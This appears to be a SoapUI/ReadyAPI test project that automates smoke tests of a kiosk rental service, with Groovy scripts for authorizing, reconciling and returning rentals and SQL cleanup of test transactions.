<?xml version="1.0" encoding="UTF-8"?>
<con:soapui-project id="fb945adb-f197-4049-92d5-92352bbd15da" activeEnvironment="QAInt" name="KioskServiceAutomation" resourceRoot="" soapui-version="6.0.0" updated="2.5.0 2018-09-14T14:45:07Z" encryptionMode="Not encrypted" abortOnError="false" runType="SEQUENTIAL" xmlns:con="http://eviware.com/soapui/config"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.actions.iface.tools.soapui.ProTestRunnerAction@values-local"><![CDATA[<xml-fragment xmlns:con="http://eviware.com/soapui/config">
  <con:entry key="Report Format(s)" value=""/>
  <con:entry key="Host:Port" value=""/>
  <con:entry key="Export JUnit Results" value="false"/>
  <con:entry key="Export All" value="false"/>
  <con:entry key="Save After" value="false"/>
  <con:entry key="Add Settings" value="false"/>
  <con:entry key="WSS Password Type" value=""/>
  <con:entry key="Endpoint" value=""/>
  <con:entry key="Test Suite Tags" value=""/>
  <con:entry key="Select Report Type" value="Test suite printable report"/>
  <con:entry key="System Properties" value=""/>
  <con:entry key="Test Suite" value="RentalScenarios"/>
  <con:entry key="Run in-process" value="false"/>
  <con:entry key="Password" value=""/>
  <con:entry key="Print Report" value="false"/>
  <con:entry key="Open Report" value="false"/>
  <con:entry key="Test Case Tags" value=""/>
  <con:entry key="Export JUnit Results with test properties" value="false"/>
  <con:entry key="Global Properties" value=""/>
  <con:entry key="Project Properties" value=""/>
  <con:entry key="Test Case" value="&lt;all>"/>
  <con:entry key="Project Password" value=""/>
  <con:entry key="Username" value=""/>
  <con:entry key="user-settings.xml Password" value=""/>
  <con:entry key="TestRunner Path" value=""/>
  <con:entry key="Environment" value="Default environment"/>
  <con:entry key="Coverage Report" value="false"/>
  <con:entry key="Enable UI" value="false"/>
  <con:entry key="Root Folder" value=""/>
  <con:entry key="Ignore Errors" value="false"/>
  <con:entry key="Domain" value=""/>
  <con:entry key="Tool Args" value=""/>
  <con:entry key="Save Project" value="false"/>
</xml-fragment>]]></con:setting><con:setting id="com.eviware.soapui.impl.wsdl.actions.iface.tools.support.ProSecurityTestRunnerAction@values-local"><![CDATA[<xml-fragment xmlns:con="http://eviware.com/soapui/config">
  <con:entry key="Report Format(s)" value="PDF"/>
  <con:entry key="Host:Port" value=""/>
  <con:entry key="Export JUnit Results" value="true"/>
  <con:entry key="Export All" value="true"/>
  <con:entry key="Save After" value="false"/>
  <con:entry key="Add Settings" value="false"/>
  <con:entry key="WSS Password Type" value=""/>
  <con:entry key="Endpoint" value=""/>
  <con:entry key="Select Report Type" value="Security Issues Report"/>
  <con:entry key="System Properties" value=""/>
  <con:entry key="Test Suite" value="&lt;all>"/>
  <con:entry key="Password" value=""/>
  <con:entry key="Print Report" value="true"/>
  <con:entry key="Open Report" value="false"/>
  <con:entry key="Security Test" value="&lt;all>"/>
  <con:entry key="Global Properties" value=""/>
  <con:entry key="Project Properties" value=""/>
  <con:entry key="Test Case" value="&lt;all>"/>
  <con:entry key="Project Password" value=""/>
  <con:entry key="Username" value=""/>
  <con:entry key="user-settings.xml Password" value=""/>
  <con:entry key="TestRunner Path" value="C:\Program Files\SmartBear\ReadyAPI-2.4.0-m-SNAPSHOT\bin"/>
  <con:entry key="Environment" value="Default environment"/>
  <con:entry key="Enable UI" value="false"/>
  <con:entry key="Root Folder" value="${WORKSPACE}"/>
  <con:entry key="Ignore Errors" value="false"/>
  <con:entry key="Domain" value=""/>
  <con:entry key="Tool Args" value=""/>
  <con:entry key="Save Project" value="false"/>
</xml-fragment>]]></con:setting></con:settings><con:testSuite id="c7b98378-4d27-4e21-becd-155a9601a32f" name="RentalScenarios"><con:description>All the disabled test case are under construction. Still work in progress. </con:description><con:settings/><con:runType>SEQUENTIAL</con:runType><con:testCase id="962f5b6f-1c1b-49c2-ae64-0f181735745c" discardOkResults="true" failOnError="false" failTestCaseOnErrors="true" keepSession="false" name="Smoke" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" maxResults="0"><con:settings><con:setting id="IncludeOverview">true</con:setting><con:setting id="IncludeResults">true</con:setting><con:setting id="FlowLayout">false</con:setting><con:setting id="ErrorDetails">true</con:setting><con:setting id="IncludeCoverage">true</con:setting></con:settings><con:testStep type="jdbc" name="WarmUp Script" id="4b22ad2d-68b7-4c5e-a046-d24d3a8944fa"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select GetDate() AS CurrentDateTime</con:query><con:properties/></con:config></con:testStep><con:testStep type="datasource" name="DataSource" id="24babaf1-0b12-4840-b5f5-80e4b4debc14"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.teststeps.datasource.DataSourceContainer@prepared-properties">&lt;xml-fragment/></con:setting></con:settings><con:config xsi:type="con:DataSourceStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSource type="JDBC"><con:configuration><driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</driver><connstr>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=QaAutomation;integratedSecurity=true;</connstr><pass>t</pass><Connection>QaAutomation( QAInt )</Connection><query>Select 
dbo.KS_SmokeTest.ID as ID,
dbo.KS_SmokeTest.Scenario as Scenario, 
dbo.KS_SmokeTest.Email as Email, 
dbo.KS_SmokeTest.CreditCardNumber as CcNumber, 
dbo.KS_SmokeTest.CreditCardType as CCType, 
dbo.KS_SmokeTest.PromoCode as PromoCode, 
dbo.KS_SmokeTest.PromoValue as PromoValue, 
dbo.KS_SmokeTest.KioskID as KioskID, 
dbo.KS_SmokeTest.RentalFormats as rentalFormats, 
dbo.KS_SmokeTest.NumberOfRentals as numOfRentals, 
dbo.KS_SmokeTest.RentalVendStatus as RentalVendStatus, 
dbo.KS_SmokeTest.PurchaseFormats as PurchaseFormats, 
dbo.KS_SmokeTest.NumberOfPurchases as numOfPurchases, 
dbo.KS_SmokeTest.PurchaseVendStatus as PurchaseVendStatus, 
dbo.KS_SmokeTest.SetDaysBack as SetDaysBack, 
dbo.KS_SmokeTest.IsOffline as IsOffline,
dbo.KS_SmokeTest.LoyaltyFlag as LoyaltyFlag
From dbo.KS_SmokeTest</query><fetchSize/><stored-procedure>false</stored-procedure></con:configuration></con:dataSource><con:property>Scenario</con:property><con:property>Email</con:property><con:property>ID</con:property><con:property>Ccnumber</con:property><con:property>CCType</con:property><con:property>PromoCode</con:property><con:property>PromoValue</con:property><con:property>KioskID</con:property><con:property>rentalFormats</con:property><con:property>numOfRentals</con:property><con:property>RentalVendStatus</con:property><con:property>PurchaseFormats</con:property><con:property>numOfPurchases</con:property><con:property>PurchaseVendStatus</con:property><con:property>SetDaysBack</con:property><con:property>IsOffline</con:property><con:property>LoyaltyFlag</con:property><con:startRow/><con:endRow/><con:recordsPerIteration>1</con:recordsPerIteration><con:completeLastOperation>true</con:completeLastOperation><con:trimValues>false</con:trimValues><con:entitizeValues>false</con:entitizeValues><con:restartOnRun>true</con:restartOnRun><con:expandProperties>false</con:expandProperties></con:config></con:testStep><con:testStep type="groovy" name="Get Data" id="cfcc0eb5-8008-41ef-a544-16c1c416142e"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def ScenarioNo =  context.expand( '${DataSource#ID}' );
testRunner.testCase.setPropertyValue("ScenarioNo", ScenarioNo.toString())
log.info ("--------------------------" + context.testCase.name + "-------------------------");
log.info ("Scenario [$ScenarioNo]:Kiosk " + context.expand( '${DataSource#Scenario}' ));
log.info ("------------------------------START----------------------------------");

//Get Data from Data Source
def ccNumber = context.expand( '${DataSource#Ccnumber}' );
def kioskID = context.expand( '${DataSource#KioskID}' );
def UseCredits = '0'; //Default to ); since credits will be disabled after Loyality is ON
def IsOffline = context.expand( '${DataSource#IsOffline}' );

//Get Encrypted CC Info using Merchant Service method.
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
encryptCC.setPropertyValue("CardNumber", ccNumber);
encryptCC.setPropertyValue("KeyID", context.expand( '${#Project#KeyId}' ));

def ccrunner = encryptCC.run( null, false );	
// show that it worked out ok
log.info("Status: $ccrunner.status, time taken for TestCase was: $ccrunner.timeTaken ms");
// assert that it didn't fail
assert ccrunner.status != Status.FAILED : ccrunner.reason

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get TaxRate for the Kiosk.
def taxDetails = sql.firstRow("Select Sales_Tax_Rate, PurchaseTaxRate, DigitalPurchaseTaxRate from KioskClient Where KioskClient_Id = $kioskID");
def rentalTaxRate = (taxDetails.Sales_Tax_Rate);
def purchaseTaxRate = (taxDetails.PurchaseTaxRate);
def digitalPurchaseTaxRate = (taxDetails.DigitalPurchaseTaxRate);

log.info ("KioskID:$kioskID; RentalTaxRate:$rentalTaxRate; PurchaseTaxRate:$purchaseTaxRate; DigitalPurchaseTaxRate:$digitalPurchaseTaxRate");
//Save Tax Rate at property level
testRunner.testCase.setPropertyValue('RentalTaxRate',rentalTaxRate.toString());
testRunner.testCase.setPropertyValue('PurchaseTaxRate',purchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('DigitalPurchaseTaxRate',digitalPurchaseTaxRate.toString());

def getCP = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Get Customer Info From Encrypted CC"];
getCP.setPropertyValue("CardHashId",encryptCC.getPropertyValue("CardID"));
def getCPrunner = getCP.run( null, false );	
// show that it worked out ok
log.info("Status: $getCPrunner.status, time taken for TestCase was: $getCPrunner.timeTaken ms");
// assert that it didn't fail
assert getCPrunner.status != Status.FAILED : getCPrunner.reason

//Get CustomerProfileNumber
def CustomerProfileNumber = getCP.getPropertyValue("CpCustomerNumber");
testRunner.testCase.setPropertyValue("CustomerProfileNumber",CustomerProfileNumber);
def CustomerID = getCP.getPropertyValue("CustomerId");
//Deleting the records from CustomerDisc to avoid below error
//Found an existing CustomerDisc record for disc: XXXXX, matching customer: XXXXXX!  Echo message, rolling back reconcile
log.info ("CustomerID : $CustomerID");
log.info("Number of customerdisc records deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in ($CustomerID)"));

//Clear Open Rental and Reservations
def runCleanCustomer = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Cleanup Open Transactions"];
runCleanCustomer.setPropertyValue("CustomerId",CustomerID);
runCleanCustomer.setPropertyValue("kioskID",kioskID);
def CleanCustomerrunner = runCleanCustomer.run( null, false );	
// show that it worked out ok
log.info("Status: $CleanCustomerrunner.status, time taken for TestCase [Cleanup Open Transactions] was: $CleanCustomerrunner.timeTaken ms");
// assert that it didn't fail
assert CleanCustomerrunner.status != Status.FAILED : CleanCustomerrunner.reason


//Create Credits.
if (CustomerProfileNumber != "" &amp;&amp; UseCredits == '2' &amp;&amp; IsOffline != "true")
{
	def generateCredits = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Set Up Credits"];
	generateCredits.setPropertyValue("CpCustomerNumber",CustomerProfileNumber);
	generateCredits.setPropertyValue("DVDCreditQty",context.expand( '${DataSource#DVDCredits}' ));
	generateCredits.setPropertyValue("MovieCreditQty",context.expand( '${DataSource#MovieCredits}' ));
	generateCredits.setPropertyValue("GameCreditQty",context.expand( '${DataSource#GameCredits}' ));

	def generateCreditsrunner = generateCredits.run( null, false );	
	// show that it worked out ok
	log.info("Status: $generateCreditsrunner.status, time taken for TestCase was: $generateCreditsrunner.timeTaken ms");
	// assert that it didn't fail
	assert generateCreditsrunner.status != Status.FAILED : generateCreditsrunner.reason

	log.info ("Successfully Created Credits");
}
else
{
	log.info ("No credits required for the testCase or CustomerProfileNumber is NULL");
}</script></con:config></con:testStep><con:testStep type="groovy" name="Authorize" id="2a5fcdcb-404f-408a-9799-fdb98bd49ec3"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
//def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
//Cleaning up the properties; set the values to NULL before the start

for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}

tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("CCNumber", context.expand( '${DataSource#Ccnumber}' ));
tc.setPropertyValue("CCType", context.expand( '${DataSource#CCType}' ));
tc.setPropertyValue("PromoCode", context.expand( '${DataSource#PromoCode}' ));
tc.setPropertyValue("PromoValue", context.expand( '${DataSource#PromoValue}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("rentalFormats", context.expand( '${DataSource#rentalFormats}' ));
tc.setPropertyValue("numOfRentals", context.expand( '${DataSource#numOfRentals}' ));
tc.setPropertyValue("PurchaseFormats", context.expand( '${DataSource#PurchaseFormats}' ));
tc.setPropertyValue("numOfPurchases", context.expand( '${DataSource#numOfPurchases}' ));
tc.setPropertyValue("SetDaysBack", context.expand( '${DataSource#SetDaysBack}' ));
tc.setPropertyValue("LoyaltyFlag", context.expand( '${DataSource#LoyaltyFlag}' ));
tc.setPropertyValue("UseCredits", '0');//HardCoded to 0 since it there will be no credits in future
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("CustomerProfileNumber", context.expand( '${#TestCase#CustomerProfileNumber}' ));
tc.setPropertyValue("EnableServiceFee", "false");
tc.setPropertyValue("ServiceFeeTaxRate", context.expand( '${#TestCase#ServiceFeeTaxRate}' ));
tc.setPropertyValue("ServiceFeeAmount", context.expand( '${#TestCase#ServiceFeeAmount}' ));
tc.setPropertyValue("HasUpsell", "false");
tc.setPropertyValue("HasOffer", "false");
tc.setPropertyValue("MDVFlag", '');
tc.setPropertyValue("MDVDiscNumber",'');

//Check how to get the disc price

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Authorize] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="Reconcile" id="4b58791a-595b-432a-afd1-324a3043f645"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status

def isOffline = context.expand( '${DataSource#IsOffline}' );
//Set properties from Data Source
//def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Reconcile"];
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Reconcile"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("UseCredits", '0');
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("RentalVendStatus", context.expand( '${DataSource#RentalVendStatus}' ));
tc.setPropertyValue("PurchaseVendStatus", context.expand( '${DataSource#PurchaseVendStatus}' ));
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));

//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
tc.setPropertyValue("PurchaseCount", authtc.getPropertyValue("PurchaseCount"));
tc.setPropertyValue("PurchaseBarcodes", authtc.getPropertyValue("PurchaseBarcodes"));
tc.setPropertyValue("PurchaseTitleIds", authtc.getPropertyValue("PurchaseTitleIds"));
tc.setPropertyValue("PurchaseProductFamily", authtc.getPropertyValue("PurchaseProductFamily"));
tc.setPropertyValue("PurchaseProductType", authtc.getPropertyValue("PurchaseProductType"));
tc.setPropertyValue("PurchaseDiscPrice", authtc.getPropertyValue("PurchaseDiscPrice"));
tc.setPropertyValue("RentalCount", authtc.getPropertyValue("RentalCount"));
tc.setPropertyValue("RentalBarcodes", authtc.getPropertyValue("RentalBarcodes"));
tc.setPropertyValue("RentalTitleIds", authtc.getPropertyValue("RentalTitleIds"));
tc.setPropertyValue("RentalProductFamily", authtc.getPropertyValue("RentalProductFamily"));
tc.setPropertyValue("RentalProductType", authtc.getPropertyValue("RentalProductType"));
tc.setPropertyValue("RentalDiscPrice", authtc.getPropertyValue("RentalDiscPrice"));
tc.setPropertyValue("RentalNonReturnPrice", authtc.getPropertyValue("RentalNonReturnPrice"));
tc.setPropertyValue("RentalNonReturnDays", authtc.getPropertyValue("RentalNonReturnDays"));
tc.setPropertyValue("HasPhysicalPurchase", authtc.getPropertyValue("HasPhysicalPurchase"));
tc.setPropertyValue("DiscountPayload", authtc.getPropertyValue("DiscountPayload"));
tc.setPropertyValue("CCPayload", authtc.getPropertyValue("CCPayload"));
tc.setPropertyValue("PromoCode", authtc.getPropertyValue("PromoCode"));
tc.setPropertyValue("PromoValue", authtc.getPropertyValue("PromoValue"));
tc.setPropertyValue("DiscountAmountList", authtc.getPropertyValue("DiscountAmountList")); //PROMO
tc.setPropertyValue("CustomerProfileNumber", authtc.getPropertyValue("CustomerProfileNumber"));
tc.setPropertyValue("EstimatedLoyaltyAmount", authtc.getPropertyValue("EstimatedLoyaltyAmount"));
tc.setPropertyValue("EnableServiceFee", authtc.getPropertyValue("EnableServiceFee"));
tc.setPropertyValue("HasUpsell",authtc.getPropertyValue("HasUpsell"));
tc.setPropertyValue("ServiceFeePayload", authtc.getPropertyValue("ServiceFeePayload"));
tc.setPropertyValue("RCFlag", authtc.getPropertyValue("RCFlag"));
tc.setPropertyValue("rentalRCFlag", authtc.getPropertyValue("rentalRCFlag"));
tc.setPropertyValue("purchaseRCFlag", authtc.getPropertyValue("purchaseRCFlag"));
//MDV
tc.setPropertyValue("RentalMDVFlag", authtc.getPropertyValue("RentalMDVFlag"));
tc.setPropertyValue("RentalMDVDiscNumber", authtc.getPropertyValue("RentalMDVDiscNumber"));
tc.setPropertyValue("PurchaseMDVFlag", authtc.getPropertyValue("PurchaseMDVFlag"));
tc.setPropertyValue("PurchaseMDVDiscNumber", authtc.getPropertyValue("PurchaseMDVDiscNumber"));

if (isOffline == 'true')
{
	//For Offline set the values to NULL
	tc.setPropertyValue("TransactionID", "null");
	tc.setPropertyValue("InvoiceID", "");
}
else
{
	tc.setPropertyValue("TransactionID", authtc.getPropertyValue("TransactionID"));
	tc.setPropertyValue("InvoiceID", authtc.getPropertyValue("InvoiceID"));
}

//tc.setPropertyValue("IsOffline", "false"); //hardCoded for time being.

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Reconcile] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Reconcile $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Reconcile $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="Return" id="b11336e7-c6e7-4c0f-bb31-f0b336834c93"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
//get the Return Test case
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Return"];
def reconciletc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Reconcile"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
def vendedBarcodes = reconciletc.getPropertyValue("VendedRentalBarcodes");
def TransactionID = reconciletc.getPropertyValue("TransactionID");
def CardType = reconciletc.getPropertyValue("CardType");
def InvoiceID = reconciletc.getPropertyValue("InvoiceID");
def IsOffline = reconciletc.getPropertyValue("IsOffline");
def RentalCount = reconciletc.getPropertyValue("VendedRentalsCount");
def PurchaseCount = reconciletc.getPropertyValue("VendedPurchaseCount");
def setDaysBack = Eval.me("[" + context.expand('${DataSource#SetDaysBack}') + "]");
def customerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );
//log.info ("setDaysBack:$setDaysBack; vendedBarcodes:$vendedBarcodes");
vendedBarcodesList = vendedBarcodes.split(",");
//Added this logic to avoid bad data in datasource; test case failure due to bad data
if (vendedBarcodesList.size() != setDaysBack.size())
{
	def difference = (vendedBarcodesList.size() - setDaysBack.size())
     for (i = 0; i &lt; difference; i++)
     {
     	setDaysBack.add('0') //if the size is different add the default to 0
     }
}
else
{
     //nothing to do, code/data looks good
}
def setDaysBackList = setDaysBack.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");

//Get Scenario Count
testRunner.testCase.setPropertyValue("ScenarioCount", (testRunner.testCase.getPropertyValue("ScenarioCount").toShort() + 1 ).toString());
testRunner.testCase.testSuite.project.testSuites[testRunner.testCase.testSuite.name].setPropertyValue("TotalScenarioCount", (testRunner.testCase.testSuite.project.testSuites[testRunner.testCase.testSuite.name].getPropertyValue("TotalScenarioCount").toShort() + 1 ).toString())

//Call Return Step in for loop based on number of barcodes.
if (vendedBarcodes == "")
{
	log.info ("No Return is required");
	testRunner.gotoStepByName("DataSource Loop");
}
else
{
	for (r = 0; r &lt; vendedBarcodesList.size(); r++)
	{				
		curvendedBarcodes = vendedBarcodesList[r].toString().trim();
		cursetDaysBack = setDaysBackList[r].toString().trim()
		log.info ("SetDaysBack:$cursetDaysBack ;Barcode:$curvendedBarcodes");
		tc.setPropertyValue("Barcode", curvendedBarcodes);
		tc.setPropertyValue("SetDaysBack", cursetDaysBack);
		tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
		tc.setPropertyValue("TransactionID", TransactionID);
		tc.setPropertyValue("ReturnType", '6' );
		tc.setPropertyValue("FailedSecurityRead", 'False' );
		tc.setPropertyValue("CustomerProfileNumber", customerProfileNumber );
		tc.setPropertyValue("CardType", CardType);
		tc.setPropertyValue("InvoiceID", InvoiceID);
		tc.setPropertyValue("IsOffline", IsOffline);
		tc.setPropertyValue("RentalCount", RentalCount);
		tc.setPropertyValue("PurchaseCount", PurchaseCount);
	
		def runner = tc.run( null, false );
		// show that it worked out ok
		log.info("Status: $runner.status, time taken for TestCase [Return] was: $runner.timeTaken ms");
		def tcStatus = (runner.status).toString()
	//	assert runner.status != Status.FAILED : runner.reason
		if(tcStatus == "FAIL")
		{
			assert runner.status == Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
		}
		else
		{
			// assert that it didn't fail
			assert runner.status != Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("DataSource Loop");
		}	
	}
}</script></con:config></con:testStep><con:testStep type="datasink" name="SaveResults" id="3479b54a-fda5-44e7-92e8-3fedf1b0e5dd"><con:settings/><con:config xsi:type="con:DataSinkStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSink type="File"><con:configuration><fileName>${projectDir}/SmokeTest_Results.txt</fileName><separator>:</separator><escape>"</escape><quote>false</quote><trim>true</trim><append>false</append><encoding>Cp1252</encoding></con:configuration></con:dataSink><con:properties><con:property><con:name>Number</con:name><con:value>${#TestCase#ScenarioNo}</con:value></con:property><con:property><con:name>Scenario</con:name><con:value>${DataSource#Scenario}</con:value></con:property><con:property><con:name>TransactionId</con:name><con:value>${#TestCase#TransactionId}</con:value></con:property><con:property><con:name>Status</con:name><con:value>${#TestCase#TestCaseStatus}</con:value></con:property><con:property><con:name>Date</con:name><con:value>${=new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date())}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="datasourceloop" name="DataSource Loop" id="0c8b65d8-c565-4733-aa89-91b9187ae2b6"><con:settings/><con:config><dataSourceStep>DataSource</dataSourceStep><targetStep>Get Data</targetStep></con:config></con:testStep><con:setupScript>testRunner.testCase.setPropertyValue("StartTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));
log.info("/###########################START###########################/");
log.info("Test Case Name : " + context.testCase.name);
log.info("/###########################START###########################/");
//Cleanup Script
log.info("Cleaning up any open transactions from previous executions...");
import com.eviware.soapui.model.testsuite.TestRunner.Status
import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def rbconstring = rbConObj.getConnectionString();
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(rbconstring);
def mssql = Sql.newInstance(msconstring);

//Disable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 0");
log.info ("Batch Job is disabled");

log.info("...cleaning up transactions");
sql.eachRow("SELECT t.transaction_id FROM [Transaction] t INNER JOIN disc_transaction dt ON t.transaction_id = dt.transaction_id WHERE t.customer_id in (321704,309946) AND dt.Transaction_Type = 1  AND t.Transaction_Status = 4 AND ((dt.DiscTransaction_Status = 2) OR ( dt.DiscTransaction_Status = 4 AND t.ChargeDate IS NOT NULL AND (ApprovalCode IS NULL OR ApprovalCode = '')))"){
//for each transaction id remove disc transaction, transaction and customer disc etc
	row ->
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM disc_transaction WHERE transaction_id = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM unplayablereturnhistory WHERE transactionid = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM [TRANSACTION] WHERE TRANSACTION_ID = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM CustomerTransaction WHERE TransactionID = ${row.Transaction_Id}"))
}


log.info("...cleaning up barcodes");
//reset the disc statuses to 'in kiosk'
log.info("Number of customer disc deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in (321704,309946)"))
//sql.executeUpdate("UPDATE disc SET physical_status = 2 Where Title_ID in (Select Title_ID from Title WHere [FormatId] = 17) and KioskClient_ID = 1505")
sql.executeUpdate("UPDATE disc SET physical_status = 2 Where KioskClient_ID = 1505");

testRunner.testCase.setPropertyValue("ScenarioCount", "0");</con:setupScript><con:tearDownScript>import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");

def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def mssql = Sql.newInstance(msconstring);
//Enable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 1");
log.info ("Batch Job is Enabled");

log.info("/###########################END###########################/");
log.info("Test Case Name : " + context.testCase.name + "Test Case Status : " + testRunner.getStatus());
log.info ("Time Taken: ${((testRunner.timeTaken)/1000)/60} mins");
log.info("/###########################END###########################/");
